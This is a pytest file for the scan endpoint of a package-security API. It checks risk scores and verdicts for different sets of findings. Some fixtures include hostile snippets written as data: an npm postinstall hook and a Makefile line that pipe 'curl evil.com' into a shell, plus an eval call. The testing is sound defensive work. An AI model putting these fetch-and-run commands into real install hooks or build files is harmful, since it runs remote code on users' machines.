"""
Sigil API — Scan Endpoint Tests

Tests for POST /v1/scan including scan submission, risk scoring, and verdict
determination for various finding combinations.
"""

from __future__ import annotations

from typing import Any

from fastapi.testclient import TestClient


class TestScanSubmission:
    """Tests for the scan submission endpoint."""

    def test_submit_scan_clean(
        self, client: TestClient, clean_scan_request: dict[str, Any]
    ) -> None:
        """A scan with no findings should return CLEAN verdict and zero score."""
        resp = client.post("/v1/scan", json=clean_scan_request)
        assert resp.status_code == 200

        data = resp.json()
        assert data["verdict"] == "CLEAN"
        assert data["risk_score"] == 0.0
        assert data["target"] == "safe-package"
        assert data["target_type"] == "pip"
        assert data["files_scanned"] == 10
        assert data["findings"] == []
        assert "scan_id" in data
        assert "created_at" in data

    def test_submit_scan_with_findings(
        self, client: TestClient, sample_scan_request: dict[str, Any]
    ) -> None:
        """A scan with malicious findings should return an elevated verdict."""
        resp = client.post("/v1/scan", json=sample_scan_request)
        assert resp.status_code == 200

        data = resp.json()
        assert data["risk_score"] > 0
        assert data["verdict"] != "CLEAN"
        assert len(data["findings"]) == 3
        assert data["target"] == "evil-package"

    def test_submit_scan_returns_scan_id(
        self, client: TestClient, clean_scan_request: dict[str, Any]
    ) -> None:
        """Each scan should receive a unique scan_id."""
        resp1 = client.post("/v1/scan", json=clean_scan_request)
        resp2 = client.post("/v1/scan", json=clean_scan_request)

        assert resp1.status_code == 200
        assert resp2.status_code == 200
        assert resp1.json()["scan_id"] != resp2.json()["scan_id"]

    def test_submit_scan_critical_findings_high_score(self, client: TestClient) -> None:
        """Critical install hook findings should produce HIGH_RISK or CRITICAL verdict."""
        payload = {
            "target": "backdoor-pkg",
            "target_type": "npm",
            "files_scanned": 5,
            "findings": [
                {
                    "phase": "install_hooks",
                    "rule": "install-npm-postinstall",
                    "severity": "CRITICAL",
                    "file": "package.json",
                    "line": 5,
                    "snippet": '"postinstall": "curl evil.com | sh"',
                    "weight": 1.0,
                },
                {
                    "phase": "install_hooks",
                    "rule": "install-makefile-curl",
                    "severity": "HIGH",
                    "file": "Makefile",
                    "line": 12,
                    "snippet": "curl evil.com | bash",
                    "weight": 1.0,
                },
            ],
            "metadata": {},
        }
        resp = client.post("/v1/scan", json=payload)
        assert resp.status_code == 200

        data = resp.json()
        # CRITICAL (5.0 base * 10x weight) + HIGH (3.0 * 10x) = 80 -> CRITICAL
        assert data["verdict"] == "CRITICAL"
        assert data["risk_score"] >= 50.0

    def test_submit_scan_with_threat_intel_hashes(self, client: TestClient) -> None:
        """Scan with hash metadata should attempt threat intel enrichment."""
        payload = {
            "target": "suspicious-pkg",
            "target_type": "pip",
            "files_scanned": 3,
            "findings": [],
            "metadata": {
                "hashes": ["abc123def456"],
            },
        }
        resp = client.post("/v1/scan", json=payload)
        assert resp.status_code == 200
        data = resp.json()
        # No matching threat in empty DB, so should still be CLEAN
        assert data["threat_intel_hits"] == []

    def test_submit_scan_validation_error(self, client: TestClient) -> None:
        """Invalid payload should return 422."""
        resp = client.post("/v1/scan", json={"invalid": True})
        assert resp.status_code == 422

    def test_submit_scan_medium_risk_verdict(self, client: TestClient) -> None:
        """Findings producing a score between 10-24 should yield MEDIUM_RISK."""
        payload = {
            "target": "medium-risk-pkg",
            "target_type": "npm",
            "files_scanned": 8,
            "findings": [
                {
                    "phase": "code_patterns",
                    "rule": "code-eval",
                    "severity": "HIGH",
                    "file": "lib.js",
                    "line": 10,
                    "snippet": "eval(code)",
                    "weight": 1.0,
                },
            ],
            "metadata": {},
        }
        resp = client.post("/v1/scan", json=payload)
        assert resp.status_code == 200

        data = resp.json()
        # HIGH (3.0) * CODE_PATTERNS (5x) = 15 -> MEDIUM_RISK
        assert data["risk_score"] == 15.0
        assert data["verdict"] == "MEDIUM_RISK"

    def test_submit_scan_low_risk_verdict(self, client: TestClient) -> None:
        """Findings producing a score between 1-9 should yield LOW_RISK."""
        payload = {
            "target": "low-risk-pkg",
            "target_type": "pip",
            "files_scanned": 5,
            "findings": [
                {
                    "phase": "credentials",
                    "rule": "cred-env-access",
                    "severity": "MEDIUM",
                    "file": "config.py",
                    "line": 3,
                    "snippet": "os.environ['API_KEY']",
                    "weight": 1.0,
                },
            ],
            "metadata": {},
        }
        resp = client.post("/v1/scan", json=payload)
        assert resp.status_code == 200

        data = resp.json()
        # MEDIUM (2.0) * CREDENTIALS (2x) = 4 -> LOW_RISK
        assert data["risk_score"] == 4.0
        assert data["verdict"] == "LOW_RISK"
